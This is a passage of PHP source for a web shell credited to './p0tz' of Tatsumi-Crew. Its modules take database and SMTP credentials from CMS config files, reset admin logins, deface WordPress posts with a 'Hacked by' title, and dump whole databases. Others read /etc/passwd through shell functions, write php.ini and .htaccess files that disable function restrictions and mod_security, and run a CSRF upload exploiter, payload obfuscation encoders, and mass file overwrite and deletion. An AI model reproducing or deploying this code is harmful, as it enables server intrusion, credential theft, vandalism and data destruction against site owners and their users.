              }
              mysql_close($conn);
            } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
              $dbhost = ambilkata($config,'server = "','"');
              $dbuser = ambilkata($config,'username = "','"');
              $dbpass = ambilkata($config,'password = "','"');
              $dbname = ambilkata($config,'database = "','"');
              $prefix = "users";
              $option = "identitas";
              $conn = mysql_connect($dbhost,$dbuser,$dbpass);
              $db = mysql_select_db($dbname);
              $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
              $result = mysql_fetch_array($q);
              $target = $result[alamat_website];
              if($target == '') {
                $target2 = $result[url];
                $url_target = "Login => <font color=maroon>error, gabisa ambil nama domain nyaa</font><br>";
                if($target2 == '') {
                  $url_target2 = "Login => <font color=maroon>error, gabisa ambil nama domain nyaa</font><br>";
                } else {
                  $cek_login3 = file_get_contents("$target2/adminweb/");
                  $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
                  if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
                    $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
                  } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
                    $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
                  } else {
                    $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=maroon>gatau admin login nya dimana :p</font> ]<br>";
                  }
                }
              } else {
                $cek_login = file_get_contents("$target/adminweb/");
                $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
                if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
                  $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
                } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
                  $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
                } else {
                  $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=maroon>gatau admin login nya dimana :p</font> ]<br>";
                }
              }
              $update = mysql_query("UPDATE $prefix SET username='$user_baru',password='$pass_baru' WHERE level='admin'");
              echo "Config => ".$file_conf."<br>";
              echo "CMS => Lokomedia<br>";
              if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
                echo $url_target2;
              } else {
                echo $url_target;
              }
              if(!$update OR !$conn OR !$db) {
                echo "Status => <font color=maroon>".mysql_error()."</font><br><br>";
              } else {
                echo "Status => <font color=green>sukses edit user, silakan login dengan user & pass yang baru.</font><br><br>";
              }
              mysql_close($conn);
            }
          }
        }
      } else {
        echo "<center>
        <font class='Courier'>Auto Edit User Config</font>
        <br><br>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set User & Pass: <br>
        <input type='text' name='user_baru' value='./p0tz' placeholder='user_baru'><br>
        <input type='text' name='pass_baru' value='TatsumiCrew' placeholder='pass_baru'><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 215px;'>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder config ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
      }
      } elseif($_GET['do'] == 'smtp') {
      echo "<center><span>NB: Tools ini work jika dijalankan di dalam folder <u>config</u> ( ex: 

    /home/user/public_html/nama_folder_config )</span></center><br>";
      function scj($dir) {
        $dira = scandir($dir);
        foreach($dira as $dirb) {
          if(!is_file("$dir/$dirb")) continue;
          $ambil = file_get_contents("$dir/$dirb");
          $ambil = str_replace("$", "", $ambil);
          if(preg_match("/JConfig|joomla/", $ambil)) {
            $smtp_host = ambilkata($ambil,"smtphost = '","'");
            $smtp_auth = ambilkata($ambil,"smtpauth = '","'");
            $smtp_user = ambilkata($ambil,"smtpuser = '","'");
            $smtp_pass = ambilkata($ambil,"smtppass = '","'");
            $smtp_port = ambilkata($ambil,"smtpport = '","'");
            $smtp_secure = ambilkata($ambil,"smtpsecure = '","'");
            echo "SMTP Host: <font color=cyan>$smtp_host</font><br>";
            echo "SMTP port: <font color=cyan>$smtp_port</font><br>";
            echo "SMTP user: <font color=cyan>$smtp_user</font><br>";
            echo "SMTP pass: <font color=cyan>$smtp_pass</font><br>";
            echo "SMTP auth: <font color=cyan>$smtp_auth</font><br>";
            echo "SMTP secure: <font color=cyan>$smtp_secure</font><br><br>";
          }
        }
      }
      $smpt_hunter = scj($dir);
      echo $smpt_hunter;
      } elseif($_GET['do'] == 'auto_wp') {
      if($_POST['hajar']) {
        $title = htmlspecialchars($_POST['new_title']);
        $pn_title = str_replace(" ", "-", $title);
        if($_POST['cek_edit'] == "Y") {
          $script = $_POST['edit_content'];
        } else {
          $script = $title;
        }
        $conf = $_POST['config_dir'];
        $scan_conf = scandir($conf);
        foreach($scan_conf as $file_conf) {
          if(!is_file("$conf/$file_conf")) continue;
          $config = file_get_contents("$conf/$file_conf");
          if(preg_match("/WordPress/", $config)) {
            $dbhost = ambilkata($config,"DB_HOST', '","'");
            $dbuser = ambilkata($config,"DB_USER', '","'");
            $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
            $dbname = ambilkata($config,"DB_NAME', '","'");
            $dbprefix = ambilkata($config,"table_prefix  = '","'");
            $prefix = $dbprefix."posts";
            $option = $dbprefix."options";
            $conn = mysql_connect($dbhost,$dbuser,$dbpass);
            $db = mysql_select_db($dbname);
            $q = mysql_query("SELECT * FROM $prefix ORDER BY ID ASC");
            $result = mysql_fetch_array($q);
            $id = $result[ID];
            $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
            $result2 = mysql_fetch_array($q2);
            $target = $result2[option_value];
            $update = mysql_query("UPDATE $prefix SET post_title='$title',post_content='$script',post_name='$pn_title',post_status='publish',comment_status='open',ping_status='open',post_type='post',comment_count='1' WHERE id='$id'");
            $update .= mysql_query("UPDATE $option SET option_value='$title' WHERE option_name='blogname' OR option_name='blogdescription'");
            echo "<div style='margin: 5px auto;'>";
            if($target == '') {
              echo "URL: <font color=maroon>error, gabisa ambil nama domain nya</font> -> ";
            } else {
              echo "URL: <a href='$target/?p=$id' target='_blank'>$target/?p=$id</a> -> ";
            }
            if(!$update OR !$conn OR !$db) {
              echo "<font color=maroon>MySQL Error: ".mysql_error()."</font><br>";
            } else {
              echo "<font color=green>sukses di ganti.</font><br>";
            }
            echo "</div>";
            mysql_close($conn);
          }
        }
      } else {
        echo "<center>
        <font class'Courier'> Auto Edit Title Plus Content WordPress</font>
        <br><br>
        <form method='post'>
        DIR Config: <br>
        <input type='text' size='50' name='config_dir' value='$dir'><br><br>
        Set Title: <br>
        <input type='text' name='new_title' value='Hacked by ./p0tz' placeholder='New Title'><br><br>
        Edit Content?: <input type='radio' name='cek_edit' value='Y' checked>Y<input type='radio' name='cek_edit' value='N'>N<br>
        <span>Jika pilih <u>Y</u> masukin script defacemu ( saran yang simple aja ), kalo pilih <u>N</u> gausah di isi.</span><br>
        <textarea name='edit_content' placeholder='contoh script: http://pastebin.com/EpP671gK' style='width: 450px; height: 150px;'></textarea><br>
        <input type='submit' name='hajar' value='Hajar!' style='width: 450px;'><br>
        </form>
        <span>NB: Tools ini work jika dijalankan di dalam folder config ( ex: /home/user/public_html/nama_folder_config )</span><br>
        ";
      }
        } elseif($_GET['do'] == 'dbdump')
        {
    echo $head.'<p align="center">';
    echo '
    <form action method=post>
    <table width=371 class=tabnet >
    <tr><th colspan="2">Database Dump</th></tr>
    <tr>
      <th>Server </th>
      <th><input class="inputz" type=text name=server size=52></th></tr><tr>
      <th>Username</td>
      <th><input class="inputz" type=text name=username size=52></th></tr><tr>
      <th>Password</td>
      <th><input class="inputz" type=text name=password size=52></th></tr><tr>
      <th>DataBase Name</td>
      <th><input class="inputz" type=text name=dbname size=52></th></tr>
      <tr>
      <th>DB Type </th>
      <th><form method=post action="'.$me.'">
      <select class="inputz" name=method>
        <option  value="gzip">Gzip</option>
        <option value="sql">Sql</option>
        </select>
      <input class="inputzbut" type=submit value="  Dump!  " ></th></tr>
      </form></center></table>';
    if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
    $date = date("Y-m-d");
    $dbserver = $_POST['server'];
    $dbuser = $_POST['username'];
    $dbpass = $_POST['password'];
    $dbname = $_POST['dbname'];
    $file = "Dump-$dbname-$date";
    $method = $_POST['method'];
    if ($method=='sql'){
    $file="Dump-$dbname-$date.sql";
    $fp=fopen($file,"w");
    }else{
    $file="Dump-$dbname-$date.sql.gz";
    $fp = gzopen($file,"w");
    }
    function write($data) {
    global $fp;
    if ($_POST['method']=='ssql'){
    fwrite($fp,$data);
    }else{
    gzwrite($fp, $data);
    }}
    mysql_connect ($dbserver, $dbuser, $dbpass);
    mysql_select_db($dbname);
    $tables = mysql_query ("SHOW TABLES");
    while ($i = mysql_fetch_array($tables)) {
        $i = $i['Tables_in_'.$dbname];
        $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
        write($create['Create Table'].";nn");
        $sql = mysql_query ("SELECT * FROM ".$i);
        if (mysql_num_rows($sql)) {
            while ($row = mysql_fetch_row($sql)) {
                foreach ($row as $j => $k) {
                    $row[$j] = "'".mysql_escape_string($k)."'";
                }
                write("INSERT INTO $i VALUES(".implode(",", $row).");n");
            }
        }
    }
    if ($method=='ssql'){
    fclose ($fp);
    }else{
    gzclose($fp);}
    header("Content-Disposition: attachment; filename=" . $file);   
    header("Content-Type: application/download");
    header("Content-Length: " . filesize($file));
    flush();

    $fp = fopen($file, "r");
    while (!feof($fp))
    {
        echo fread($fp, 65536);
        flush();
    } 
    fclose($fp); 
    }
    } elseif($_GET['do'] == 'hash') {
     $submit = $_POST['enter'];
       
     if (isset($submit)) {
       $pass = $_POST['password']; // password
          
      $salt = '}#f4ga~g%7hjg4&j(7mk?/!bj30ab-wi=6^7-$^R9F|GK5J#E6WT;IO[JN'; // random string
     
         $hash = md5($pass); // md5 hash #1
         
       $md4 = hash("md4", $pass);
            $hash_md5 = md5($salt . $pass); // md5 hash with salt #2
       
         $hash_md5_double = md5(sha1($salt . $pass)); // md5 hash with salt & sha1 #3
         
       $hash1 = sha1($pass); // sha1 hash #4
            $sha256 = hash("sha256", $text);
         
       $hash1_sha1 = sha1($salt . $pass); // sha1 hash with salt #5
           
     $hash1_sha1_double = sha1(md5($salt . $pass)); // sha1 hash with salt & md5 #6
         
       
        }
        echo '<form action="" method="post"><b> ';
      
      echo '<center><h2><b>-=[ Password Hash ]=-</b></h2></tr>';
     
       echo ' <b>masukan Password yang ingin di encrypt:</b><br> ';
      
      echo ' <input class="inputz" type="text" name="password" size="40" />';
     
       echo '<br><input class="inputzbut" type="submit" name="enter" value="hash" />';
      
      echo ' <br>';
      echo '<center><h2><b>-=[ Hasil Hash ]=-</b></h2></tr>';
     
       echo ' Original Password 
       <br><input class=inputz type=text size=50 value=' . $pass . '> <br><br>';
     
       echo ' MD5  
       <br><input class=inputz type=text size=50 value=' . $hash . '> <br>';
        
    echo ' MD4  
    <br><input class=inputz type=text size=50 value=' . $md4 . '> <br>';
        
    echo ' MD5 with Salt  
    <br><input class=inputz type=text size=50 value=' . $hash_md5 . '> <br>';
      
      echo ' MD5 with Salt & Sha1  
      <br><input class=inputz type=text size=50 value=' . $hash_md5_double . '> <br>';

        echo ' Sha1  
        <br><input class=inputz type=text size=50 value=' . $hash1 . '> <br>';
     
       echo ' Sha256  
       <br><input class=inputz type=text size=50 value=' . $sha256 . '> <br>';
     
       echo ' Sha1 with Salt  
       <br><input class=inputz type=text size=50 value=' . $hash1_sha1 . '> <br>';
     
       echo ' Sha1 with Salt & MD5  
       <br><input class=inputz type=text size=50 value=' . $hash1_sha1_double . '> <br>';
   }elseif($_GET['do'] == 'about'){
echo "<center>
<img src='https://4.bp.blogspot.com/-nqELTespHdU/WontZiUNB3I/AAAAAAAAAx4/nX-bGZJ6Fx81SUTwYE1Yxp-xFR_T1qVuACLcBGAs/s320/lambang4.png width='200px' height='150px' class='muter' style='float: center;'>
<p>Created by ./p0tz</p>
<p>Karena Orang Bodoh Seperti Kami Akan Sukses Dengan Sendirinya.</p>
<p>タツミクール - 沈黙はダイヤです</p>
<p><a style='text-decoration:none;' href='http://tatsumi-crew.net'>Tatsumi-Crew.NET</a></p></center>";
echo "<br>";
    } elseif($_GET['do'] == 'hashid') {
    if (isset($_POST['gethash'])) {
            $hash = $_POST['hash'];
            if (strlen($hash) == 32) {
                $hashresult = "MD5 Hash";
            } elseif (strlen($hash) == 40) {
                $hashresult = "SHA-1 Hash/ /MySQL5 Hash";
            } elseif (strlen($hash) == 13) {
                $hashresult = "DES(Unix) Hash";
            } elseif (strlen($hash) == 16) {
                $hashresult = "MySQL Hash / /DES(Oracle Hash)";
            } elseif (strlen($hash) == 41) {
                $GetHashChar = substr($hash, 40);
                if ($GetHashChar == "*") {
                    $hashresult = "MySQL5 Hash";
                }
            } elseif (strlen($hash) == 64) {
                $hashresult = "SHA-256 Hash";
            } elseif (strlen($hash) == 96) {
                $hashresult = "SHA-384 Hash";
            } elseif (strlen($hash) == 128) {
                $hashresult = "SHA-512 Hash";
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$1$')) {
                    $hashresult = "MD5(Unix) Hash";
                }
            } elseif (strlen($hash) == 37) {
                if (strstr($hash, '$apr1$')) {
                    $hashresult = "MD5(APR) Hash";
                }
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$H$')) {
                    $hashresult = "MD5(phpBB3) Hash";
                }
            } elseif (strlen($hash) == 34) {
                if (strstr($hash, '$P$')) {
                    $hashresult = "MD5(Wordpress) Hash";
                }
            } elseif (strlen($hash) == 39) {
                if (strstr($hash, '$5$')) {
                    $hashresult = "SHA-256(Unix) Hash";
                }
            } elseif (strlen($hash) == 39) {
                if (strstr($hash, '$6$')) {
                    $hashresult = "SHA-512(Unix) Hash";
                }
            } elseif (strlen($hash) == 24) {
                if (strstr($hash, '==')) {
                    $hashresult = "MD5(Base-64) Hash";
                }
            } else {
                $hashresult = "Hash type not found";
            }
        } else {
            $hashresult = "Not Hash Entered";
        }
    ?>
      <center><br><Br><br>
      
        <form action="" method="POST">
        <tr>
        <table >
        <th colspan="5">Hash Identification</th>
        <tr class="optionstr"><B><td>Enter Hash</td></b><td>:</td>  <td><input type="text" name="hash" size='60' class="inputz" /></td><td><input type="submit" class="inputzbut" name="gethash" value="Identify Hash" /></td></tr>
        <tr class="optionstr"><b><td>Result</td><td>:</td><td><?php echo $hashresult; ?></td></tr></b>
      </table></tr></form>
      </center>
    <?php
      }elseif($_GET['do'] == 'passwbypass') {
       echo '<center>Bypass etc/passw With:<br>
    <table style="width:50%">
      <tr>
        <td><form method="post"><input type="submit" value="System Function" name="syst"></form></td>
        <td><form method="post"><input type="submit" value="Passthru Function" name="passth"></form></td>
        <td><form method="post"><input type="submit" value="Exec Function" name="ex"></form></td> 
        <td><form method="post"><input type="submit" value="Shell_exec Function" name="shex"></form></td>   
        <td><form method="post"><input type="submit" value="Posix_getpwuid Function" name="melex"></form></td>
    </tr></table>Bypass User With : <table style="width:50%">
    <tr>
        <td><form method="post"><input type="submit" value="Awk Program" name="awkuser"></form></td>
        <td><form method="post"><input type="submit" value="System Function" name="systuser"></form></td>
        <td><form method="post"><input type="submit" value="Passthru Function" name="passthuser"></form></td> 
        <td><form method="post"><input type="submit" value="Exec Function" name="exuser"></form></td>   
        <td><form method="post"><input type="submit" value="Shell_exec Function" name="shexuser"></form></td>
    </tr>
    </table><br>';


    if ($_POST['awkuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo shell_exec("awk -F: '{ print $1 }' /etc/passwd | sort");
    echo "</textarea><br>";
    }
    if ($_POST['systuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo system("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['passthuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo passthru("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['exuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo exec("ls /var/mail");
    echo "</textarea><br>";
    }
    if ($_POST['shexuser']) {
    echo"<textarea class='inputzbut' cols='65' rows='15'>";
    echo shell_exec("ls /var/mail");
    echo "</textarea><br>";
    }
    if($_POST['syst'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo system("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['passth'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo passthru("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['ex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo exec("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    if($_POST['shex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    echo shell_exec("cat /etc/passwd");
    echo"</textarea><br><br><b></b><br>";
    }
    echo '<center>';
    if($_POST['melex'])
    {
    echo"<textarea class='inputz' cols='65' rows='15'>";
    for($uid=0;$uid<60000;$uid++){ 
    $ara = posix_getpwuid($uid);
    if (!empty($ara)) {
    while (list ($key, $val) = each($ara)){
    print "$val:";
    }
    print "\n";
    }
    }
    echo"</textarea><br><br>";
    }
    } elseif($_GET['do'] == 'bypass'){
        echo "<center>";
        echo "<form method=post><input type=submit name=ini value='php.ini' />&nbsp;<input type=submit name=htce value='.htaccess' /></form>";
        if(isset($_POST['ini']))
    {
        $file = fopen("php.ini","w");
        echo fwrite($file,"disable_functions=none
    safe_mode = Off
      ");
        fclose($file);
        echo "<a href='php.ini'>click here!</a>";
    }   if(isset($_POST['htce']))
    {
        $file = fopen(".htaccess","w");
        echo fwrite($file,"<IfModule mod_security.c>
    SecFilterEngine Off
    SecFilterScanPOST Off
    </IfModule>
      ");
        fclose($file);
        echo "htaccess successfully created!";
    }
        echo"</center>";
    } elseif($_GET['do'] == 'csrfup')
    { 
    echo '<html>
    <center><font style="Courier";>CSRF Exploiter By IndoXPloit<br>Recoded by ./p0tz</h1><br><br>
    <font style="Courier">*Note : Post File, Type : Filedata / dzupload / dzfile / dzfiles / file / ajaxfup / files[] / qqfile / userfile / etc</font>
    <br><br>
    <form method="post" style="Courier">
    URL:&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp <input type="text" name="url" size="50" height="10" placeholder="http://www.target.com/path/upload.php" style="margin: 5px auto; padding-left: 5px;" required><br>
    POST File: <input type="text" name="pf" size="50" height="10" placeholder="Lihat diatas ^" style="margin: 5px auto; padding-left: 5px;" required><br>
    <input type="submit" name="d" value="Lock!">
    </form>';
    $url = $_POST["url"];
    $pf = $_POST["pf"];
    $d = $_POST["d"];
    if($d) {
      echo "<form method='post' target='_blank' action='$url' enctype='multipart/form-data'><input type='file' name='$pf'><input type='submit' name='g' value='Upload'></form></form>
    </html>";
    }
    } elseif ($_GET['do'] == 'string') {
            $text = $_POST['code'];
    ?><center>
    <font>String Encode & Decode</font>
    <form method="post"><br>
    <textarea cols=80 rows=10 name="code"></textarea><br><br>
    <select size="1" name="ope">
    <option value="urlencode" style='background:transparent;color:aqua;'>Select Type</option>
    <option value="base64" style='background:transparent;color:aqua;'>Base64</option>
    <option value="ur" style='background:transparent;color:aqua;'>convert_uu</option>
    <option value="json" style='background:transparent;color:aqua;'>json</option>
    <option value="gzinflates" style='background:transparent;color:aqua;'>gzinflate - base64</option>
    <option value="str2" style='background:transparent;color:aqua;'>str_rot13 - base64</option>
    <option value="gzinflate" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - base64</option>
    <option value="gzinflater" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - base64</option>
    <option value="gzinflatex" style='background:transparent;color:aqua;'>gzinflate - str_rot13 - gzinflate - 

    base64</option>
    <option value="gzinflatew" style='background:transparent;color:aqua;'>str_rot13 - convert_uu - url - gzinflate 

    - str_rot13 - base64 - convert_uu - gzinflate - url - str_rot13 - gzinflate - base64</option>
    <option value="str" style='background:transparent;color:aqua;'>str_rot13 - gzinflate - str_rot13 - 

    base64</option>
    <option value="url" style='background:transparent;color:aqua;'>base64 - gzinflate - str_rot13 - convert_uu - 

    gzinflate - base64</option>
    <option value="hexencode" style='background:transparent;color:aqua;'>Hex Encode/Decode</option>
    <option value="md5" style='background:transparent;color:aqua;'><center>MD5 Hash</option>
    <option value="sha1" style='background:transparent;color:aqua;'>SHA1 Hash</option>
    <option value="str_rot13" style='background:transparent;color:aqua;'>ROT13 Hash</option>
    <option value="strlen" style='background:transparent;color:aqua;'>strlen</option>
    <option value="xxx" style='background:transparent;color:aqua;'>unescape</option>
    <option value="bbb" style='background:transparent;color:aqua;'>charAt</option>
    <option value="aaa" style='background:transparent;color:aqua;'>chr - bin2hex - substr</option>
    <option value="www" style='background:transparent;color:aqua;'>chr</option>
    <option value="sss" style='background:transparent;color:aqua;'>htmlspecialchars</option>
    <option value="eee" style='background:transparent;color:aqua;'>escape</option></select>&nbsp;
    <input class='kotak' type='submit' name='submit' value='Encrypt'>
    <input class='kotak' type='submit' name='crack' value='Decrypt'>
    </form>

    <?php
            $submit = $_POST['submit'];
            if (isset($submit)) {
                $op = $_POST["ope"];
                switch ($op) {
                    case 'base64':
                        $codi = base64_encode($text);
                    break;
                    case 'str':
                        $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
                    break;
                    case 'json':
                        $codi = json_encode(utf8_encode($text));
                    break;
                    case 'gzinflate':
                        $codi = base64_encode(gzdeflate(str_rot13($text)));
                    break;
                    case 'gzinflater':
                        $codi = base64_encode(str_rot13(gzdeflate($text)));
                    break;
                    case 'gzinflatex':
                        $codi = base64_encode(gzdeflate(str_rot13(gzdeflate($text))));
                    break;
                    case 'gzinflatew':
                        $codi = base64_encode(gzdeflate(str_rot13(rawurlencode(gzdeflate(convert_uuencode

    (base64_encode(str_rot13(gzdeflate(convert_uuencode(rawurldecode(str_rot13($text))))))))))));
                    break;
                    case 'gzinflates':
                        $codi = base64_encode(gzdeflate($text));
                    break;
                    case 'str2':
                        $codi = base64_encode(str_rot13($text));
                    break;
                    case 'urlencode':
                        $codi = rawurlencode($text);
                    break;
                    case 'hexencode':
                        $codi = bin2hex($text);
                    break;
                    case 'md5':
                        $codi = md5($text);
                    break;
                    case 'ur':
                        $codi = convert_uuencode($text);
                    break;
                    case 'str_rot13':
                        $codi = str_rot13($text);
                    break;
                    case 'sha1':
                        $codi = sha1($text);
                    break;
                    case 'strlen':
                        $codi = strlen($text);
                    break;
                    case 'xxx':
                        $codi = strlen(bin2hex($text));
                    break;
                    case 'bbb':
                        $codi = htmlentities(utf8_decode($text));
                    break;
                    case 'aaa':
                        $codi = chr(bin2hex(substr($text)));
                    break;
                    case 'www':
                        $codi = chr($text);
                    break;
                    case 'sss':
                        $codi = htmlspecialchars($text);
                    break;
                    case 'eee':
                        $codi = addslashes($text);
                    break;
                    case 'url':
                        $codi = base64_encode(gzdeflate(convert_uuencode(str_rot13(gzdeflate(base64_encode

    ($text))))));
                    break;
                    default:
                    break;
                }
            }
            // Decrypt Start Now !!
            $submit = $_POST['crack'];
            if (isset($submit)) {
                $op = $_POST["ope"];
                switch ($op) {
                    case 'base64':
                        $codi = base64_decode($text);
                    break;
                    case 'str':
                        $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
                    break;
                    case 'json':
                        $codi = utf8_dencode(json_dencode($text));
                    break;
                    case 'gzinflate':
                        $codi = str_rot13(gzinflate(base64_decode($text)));
                    break;
                    case 'gzinflater':
                        $codi = gzinflate(str_rot13(base64_decode($text)));
                    break;
                    case 'gzinflatex':
                        $codi = gzinflate(str_rot13(gzinflate(base64_decode($text))));
                    break;
                    case 'gzinflatew':
                        $codi = str_rot13(rawurldecode(convert_uudecode(gzinflate(str_rot13(base64_decode

    (convert_uudecode(gzinflate(rawurldecode(str_rot13(gzinflate(base64_decode($text))))))))))));
                    break;
                    case 'gzinflates':
                        $codi = gzinflate(base64_decode($text));
                    break;
                    case 'str2':
                        $codi = str_rot13(base64_decode($text));
                    break;
                    case 'urlencode':
                        $codi = rawurldecode($text);
                    break;
                    case 'hexencode':
                        $codi = quoted_printable_decode($text);
                    break;
                    case 'ur':
                        $codi = convert_uudecode($text);
                    break;
                    case 'url':
                        $codi = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode

    (($text)))))));
                    break;
                    default:
                    break;
                }
            }
            echo '<textarea cols=80 rows=10 readonly>' . $codi . '</textarea></center><BR><BR>';
    } elseif($_GET['do'] == 'mass_deface') {
      echo "<center><form action=\"\" method=\"post\">\n";
      $dirr=$_POST['d_dir'];
      $index = $_POST["script"];
      $index = str_replace('"',"'",$index);
      $index = stripslashes($index);
      function edit_file($file,$index){
        if (is_writable($file)) {
        clear_fill($file,$index);
        echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
        } 
        else {
          echo "<Span style='color:maroon;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
          }
          }
      function hapus_massal($dir,$namafile) {
        if(is_writable($dir)) {
          $dira = scandir($dir);
          foreach($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc.'/'.$namafile;
            if($dirb === '.') {
              if(file_exists("$dir/$namafile")) {
                unlink("$dir/$namafile");
              }
            } elseif($dirb === '..') {
              if(file_exists("".dirname($dir)."/$namafile")) {
                unlink("".dirname($dir)."/$namafile");
              }
            } else {
              if(is_dir($dirc)) {
                if(is_writable($dirc)) {
                  if(file_exists($lokasi)) {
                    echo "[<font color=lime>DELETED</font>] $lokasi<br>";
                    unlink($lokasi);
                    $idx = hapus_massal($dirc,$namafile);
                  }
                }
              }
            }
          }
        }
      }
      function clear_fill($file,$index){
        if(file_exists($file)){
          $handle = fopen($file,'w');
          fwrite($handle,'');
          fwrite($handle,$index);
          fclose($handle);  } }

      function gass(){
        global $dirr , $index ;
        chdir($dirr);
        $me = str_replace(dirname(__FILE__).'/','',__FILE__);
        $files = scandir($dirr) ;
        $notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
        sort($files);
        $n = 0 ;
        foreach ($files as $file){
          if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
            echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
            edit_file($file,$index);
            flush();
            $n = $n +1 ;
            } 
            }
            echo "<br>";
            echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
              }
      function ListFiles($dirrall) {

        if($dh = opendir($dirrall)) {

           $files = Array();
           $inner_files = Array();
           $me = str_replace(dirname(__FILE__).'/','',__FILE__);
           $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
            while($file = readdir($dh)) {
                if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                    if(is_dir($dirrall . "/" . $file)) {
                        $inner_files = ListFiles($dirrall . "/" . $file);
                        if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                    } else {
                        array_push($files, $dirrall . "/" . $file);
                    }
                }
          }

          closedir($dh);
          return $files;
        }
      }
      function gass_all(){
        global $index ;
        $dirrall=$_POST['d_dir'];
        foreach (ListFiles($dirrall) as $key=>$file){
          $file = str_replace('//',"/",$file);
          echo "<center><strong>$file</strong> ===>";
          edit_file($file,$index);
          flush();
        }
        $key = $key+1;
      echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
      function sabun_massal($dir,$namafile,$isi_script) {
        if(is_writable($dir)) {
          $dira = scandir($dir);
          foreach($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc.'/'.$namafile;
            if($dirb === '.') {
              file_put_contents($lokasi, $isi_script);
            } elseif($dirb === '..') {
              file_put_contents($lokasi, $isi_script);
            } else {
              if(is_dir($dirc)) {
                if(is_writable($dirc)) {
                  echo "[<font color=lime>DONE</font>] $lokasi<br>";
                  file_put_contents($lokasi, $isi_script);
                  $idx = sabun_massal($dirc,$namafile,$isi_script);
                }
              }
            }
          }
        }
      }

      if($_POST['mass'] == 'onedir') {
        echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:maroon;' name='index' rows='10' cols='67'>\n";
        $ini="http://";
        $mainpath=$_POST[d_dir];
        $file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){
        $start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){
          echo"$ini$row/$file\n";
          }
        }
        echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
        $mainpath=$_POST[d_dir];$file=$_POST[d_file];
        $dir=opendir("$mainpath");
        $code=base64_encode($_POST[script]);
        $indx=base64_decode($code);
        while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
        $finish=@fwrite($start,$indx);
        if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
        }

      }
      elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
      elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
